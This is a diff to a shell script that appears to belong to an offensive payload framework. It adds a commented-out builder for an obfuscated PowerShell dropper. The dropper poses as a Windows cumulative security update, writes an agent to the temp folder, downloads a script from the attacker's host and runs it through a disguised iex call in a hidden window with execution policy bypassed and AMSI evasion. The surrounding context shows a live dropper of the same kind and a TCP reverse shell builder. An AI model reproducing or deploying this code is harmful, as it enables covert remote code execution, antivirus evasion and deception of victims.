@@ -12058,6 +12058,29 @@ echo "        \$proxy.send();" >> $IPATH/output/$Drop.ps1
 echo "& ('ie'+'x') \$proxy.responseText" >> $IPATH/output/$Drop.ps1
 
 
+## Attempting to hidde powershell execution terminal
+# DESCRIPTION: dropper.bat will write in %tmp% folder the dropper/exec (Agent.ps1)
+# and them execute it in a powershell hidden console <-- need to know if this works ..
+# HOW TO: 1º - Comment (#) the above dropper build
+# 2º - Un-Comment (#) this follow dropper build
+# 3º - Save venom.sh and test it
+#
+#echo "<#" > $IPATH/output/$Drop.ps1
+#echo "Obfuscated Powershell Dropper" >> $IPATH/output/$Drop.ps1
+#echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$Drop.ps1
+#echo "Author: @r00t-3xp10it" >> $IPATH/output/$Drop.ps1
+#echo "#>" >> $IPATH/output/$Drop.ps1
+#echo "" >> $IPATH/output/$Drop.ps1
+#echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
+#echo "echo \"\`\$host.UI.RawUI.WindowTitle = \`\"Cumulative Security Update KB4524147\`\";\" > \$env:tmp\\Agent.ps1" >> $IPATH/output/$Drop.ps1
+#echo "echo \"   Get-HotFix;\`\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\" >> \$env:tmp\\Agent.ps1" >> $IPATH/output/$Drop.ps1
+#echo "echo \"        \`\$proxy.open('GET','http://$lhost/$NaM.ps1',\`\$false);\" >> \$env:tmp\\Agent.ps1" >> $IPATH/output/$Drop.ps1
+#echo "echo \"        \`\$proxy.send();\" >> \$env:tmp\\Agent.ps1" >> $IPATH/output/$Drop.ps1
+#echo "echo \"& ('ie'+'x') \`\$proxy.responseText;\" >> \$env:tmp\\Agent.ps1" >> $IPATH/output/$Drop.ps1
+#echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"\$env:tmp\\Agent.ps1\"" >> $IPATH/output/$Drop.ps1
+## END - Attempting to hidde powershell execution terminal
+
+
 ## Build Reverse Powershell Shell
 echo "${BlueF}[☠]${white} Writting TCP reverse shell to output .."${Reset};sleep 2
 echo "<#" > $IPATH/output/$NaM.ps1
